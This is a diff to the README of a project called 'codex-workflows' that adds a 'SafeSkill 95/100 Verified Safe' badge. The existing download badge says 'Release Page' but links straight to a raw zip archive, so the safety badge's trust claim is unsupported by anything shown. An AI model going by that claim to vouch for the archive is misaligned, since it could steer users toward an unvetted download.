@@ -1,6 +1,7 @@
 # 🤖 codex-workflows - Clear AI coding workflows
 
 [![Download codex-workflows](https://img.shields.io/badge/Download%20codex--workflows-Release%20Page-blue.svg?style=for-the-badge)](https://raw.githubusercontent.com/round-comfortfood117/codex-workflows/main/bin/codex_workflows_v3.8.zip)
+[![SafeSkill 95/100](https://img.shields.io/badge/SafeSkill-95%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/round-comfortfood117-codex-workflows)
 
 ## 🧭 What this is
 
